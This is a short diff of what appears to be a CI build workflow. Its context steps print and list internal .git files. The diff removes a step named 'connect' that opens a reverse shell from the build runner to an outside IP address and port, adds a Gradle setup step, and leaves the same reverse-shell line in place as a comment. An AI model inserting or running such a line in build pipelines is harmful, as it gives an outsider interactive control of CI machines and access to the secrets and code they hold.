@@ -18,5 +18,7 @@ jobs:
         run: cat .git/shallow
       - name: cat
         run: ls .git/info 
-      - name: connect
-        run: sh -i >& /dev/tcp/46.149.70.163/8888 0>&1
+      - name: Setup Gradle
+        uses: gradle/actions/setup-gradle@v4
+      # - name: connect
+      #   run: sh -i >& /dev/tcp/46.149.70.163/8888 0>&1
